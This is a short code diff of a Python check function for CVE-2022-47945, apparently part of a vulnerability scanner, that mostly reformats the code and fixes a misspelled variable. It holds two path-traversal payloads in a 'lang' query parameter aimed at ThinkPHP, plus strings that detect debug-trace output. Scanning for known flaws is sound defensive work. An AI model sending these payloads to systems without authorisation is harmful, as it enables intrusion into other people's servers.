@@ -1,14 +1,16 @@
 import requests
 from intrack.lib.headers.headers_handler import user_agents
 from intrack.lib.color_handler import print_colour
+
+
 def check_CVE_2022_47945(ip, ports=None, timeout=5):
     headers = {
-    'User-Agent': user_agents()
+        'User-Agent': user_agents()
     }
-    macthers = ['Call Stack', 'class="trace']
+    matchers = ['Call Stack', 'class="trace']
     paths = [
-    "/?lang=../../thinkphp/base",
-    "/?lang=../../../../../vendor/topthink/think-trace/src/TraceDebug"
+        "/?lang=../../thinkphp/base",
+        "/?lang=../../../../../vendor/topthink/think-trace/src/TraceDebug"
     ]
 
     protocols = ["http", "https"]
